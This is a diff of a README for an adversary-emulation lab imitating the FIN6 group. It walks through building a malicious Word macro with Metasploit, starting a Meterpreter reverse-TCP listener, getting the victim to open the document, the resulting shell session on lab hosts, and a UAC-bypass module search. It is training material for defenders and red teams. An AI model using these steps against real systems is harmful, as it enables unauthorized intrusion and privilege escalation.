@@ -18,7 +18,7 @@ This repository contains a full simulation of the FIN6 adversary group behavior 
   - Discovery
   - Privilege Escalation
   - Credential Dumping
-  - Exfiltration
+
 
 ---
 
@@ -30,7 +30,7 @@ This repository contains a full simulation of the FIN6 adversary group behavior 
 | Discovery            | Domain Users, Computers, Groups         | T1087, T1018     |
 | Priv. Escalation     | Token Impersonation (getsystem)         | T1134            |
 | Credential Dumping   | Mimikatz, NTDS.dit extraction           | T1003.001/003    |
-| Exfiltration         | FTP via script                          | T1048.003        |
+
 
 ---
 
@@ -50,17 +50,13 @@ This repository contains a full simulation of the FIN6 adversary group behavior 
 
 - `Metasploit Framework`
 - `Office Word Macro Exploit`
-- `AdFind.exe`
 - `PowerShell`
-- `vssadmin`, `reg`, `nltest`
-- `7-Zip` CLI (`7.exe`)
-- `pyftpdlib` for FTP exfiltration
 
 ---
 
 ## 🧵 Lab Workflow Summary
 
-1. **Create Macro Payload**
+## 1. **Create Macro Payload**
    ```bash
 
     ┌──(attacker㉿kali)-[~/AdversaryEmulation/labs/lab_1.3]
@@ -120,6 +116,11 @@ This repository contains a full simulation of the FIN6 adversary group behavior 
     [*] Injecting macro and other required files in document
     [*] Finalizing docm: msf.docm
     [+] msf.docm stored at /root/.msf4/local/msf.docm
+
+   ```
+   
+## 2. **Setup Listener**
+   ```bash 
     msf6 exploit(multi/fileformat/office_word_macro) > use exploit/multi/handler
     [*] Using configured payload generic/shell_reverse_tcp
     msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
@@ -152,7 +153,25 @@ This repository contains a full simulation of the FIN6 adversary group behavior 
     msf6 exploit(multi/handler) > exploit
     
     [*] Started reverse TCP handler on 192.168.125.103:4444 
-    
+
+```
+## 3. **Host File**
+  
+  <img width="1034" height="498" alt="Screenshot 2025-07-18 at 12 16 50 AM" src="https://github.com/user-attachments/assets/734fa0bd-6ccd-40f8-927e-e94a223eb2b6" />
+
+## 4. **Download on Target**
+
+   <img width="1440" height="827" alt="Screenshot 2025-07-18 at 12 16 37 AM" src="https://github.com/user-attachments/assets/c2768258-5ee2-4c46-a5e3-165e71a34112" />
+
+## 5. **Execute Macro in Elevated Word**
+  <img width="1440" height="827" alt="enable-content" src="https://github.com/user-attachments/assets/7e04f3be-2035-4422-a7b9-3fc43120733c" />
+
+
+## 6. **Post-Access: Discovery & Priv-Esc**
+
+  <img width="1440" height="783" alt="Screenshot 2025-07-18 at 12 24 17 AM" src="https://github.com/user-attachments/assets/4e3e992b-c721-49e5-a213-d80675596f50" />
+
+   ```bash
     [*] Sending stage (176198 bytes) to 192.168.125.104
     [*] Meterpreter session 1 opened (192.168.125.103:4444 -> 192.168.125.104:50369) at 2025-07-17 14:50:41 -0400
     
@@ -234,6 +253,11 @@ This repository contains a full simulation of the FIN6 adversary group behavior 
     meterpreter > Interrupt: use the 'exit' command to quit
     meterpreter > background
     [*] Backgrounding session 1...
+
+   ```
+## 7. **Uac bypass**
+   
+   ```bash
     msf6 exploit(multi/handler) > search bypassuac
     
     Matching Modules
@@ -486,6 +510,7 @@ This repository contains a full simulation of the FIN6 adversary group behavior 
 
    ```
 
+  <img width="1440" height="778" alt="Screenshot 2025-07-18 at 12 36 31 AM" src="https://github.com/user-attachments/assets/4869040f-1298-40e4-ba3c-3d249a8ff7ea" />
 
 
 ---
